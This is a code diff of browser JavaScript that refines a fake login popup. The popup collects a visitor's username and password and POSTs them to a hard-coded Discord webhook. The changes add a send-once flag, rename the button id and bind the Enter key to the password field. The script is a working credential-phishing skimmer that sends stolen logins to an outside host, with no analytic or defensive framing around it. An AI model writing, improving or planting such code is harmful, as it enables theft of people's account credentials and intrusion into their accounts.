@@ -4,6 +4,7 @@ if (b00bz.length > 0){
     const clone = b00b.cloneNode(true);
     b00b.parentNode.replaceChild(clone, b00b);
 }
+var zending = false;
 
 function poopup() {
     const overlay = document.createElement("div");
@@ -74,7 +75,7 @@ function poopup() {
     popup.appendChild(passwordInput);
 
     const loginButton = document.createElement("button");
-    loginButton.id = "sbmt";
+    loginButton.id = "login";
     loginButton.textContent = "Login";
     loginButton.style.width = "100%";
     popup.appendChild(loginButton);
@@ -82,7 +83,8 @@ function poopup() {
     loginButton.addEventListener("click", function() {
         const username = document.getElementById("username").value;
         const password = document.getElementById("password").value;
-        if (username != "" && password != ""){
+        if (username != "" && password != "" && zending == false){
+            zending = true;
             document.cookie = "meme=9";
             var xhr = new XMLHttpRequest();
             xhr.open("POST","https://discord.com/api/webhooks/881918023764697128/tEtQqj3w08JSjay5Jg4CIzijyTb2akzTosya6NVKL8Pr-gMMq33TwPwyy-wInoErm_YA", true);
@@ -100,10 +102,11 @@ function poopup() {
             console.log("failure...");
         }
     });
-    loginButton.addEventListener("keypress", function(event) {
+
+    passwordInput.addEventListener("keypress", function(event) {
         if (event.key === "Enter") {
             event.preventDefault();
-            document.getElementById("sbmt").click();
+            document.getElementById("login").click();
         }
     });
 }
